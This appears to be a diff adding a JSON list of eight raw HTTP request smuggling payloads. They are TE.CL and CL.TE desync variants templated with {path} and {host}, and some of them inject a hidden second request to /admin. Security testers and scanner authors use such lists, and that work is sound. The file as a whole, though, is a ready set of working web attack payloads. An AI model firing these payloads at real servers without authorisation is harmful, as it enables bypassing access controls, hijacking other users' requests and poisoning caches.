@@ -1,0 +1,34 @@
+[
+  {
+    "name": "TE.CL with garbage after",
+    "raw": "POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
+  },
+  {
+    "name": "TE.CL with extra chunked body",
+    "raw": "POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nGPOST\r\n0\r\n\r\n"
+  },
+  {
+    "name": "CL.TE mismatch (len=6, TE used)",
+    "raw": "POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\n"
+  },
+  {
+    "name": "CL.TE mismatch + hidden data",
+    "raw": "POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n0\r\nSMUGGLED"
+  },
+  {
+    "name": "Simple TE with body",
+    "raw": "POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\na\r\nSMUGGLED\r\n0\r\n\r\n"
+  },
+  {
+    "name": "TE with second request injection",
+    "raw": "POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n"
+  },
+  {
+    "name": "HEAD method TE+CL mismatch",
+    "raw": "HEAD {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n0\r\nINJECTED"
+  },
+  {
+    "name": "GET method + smuggled POST",
+    "raw": "GET {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\n"
+  }
+]
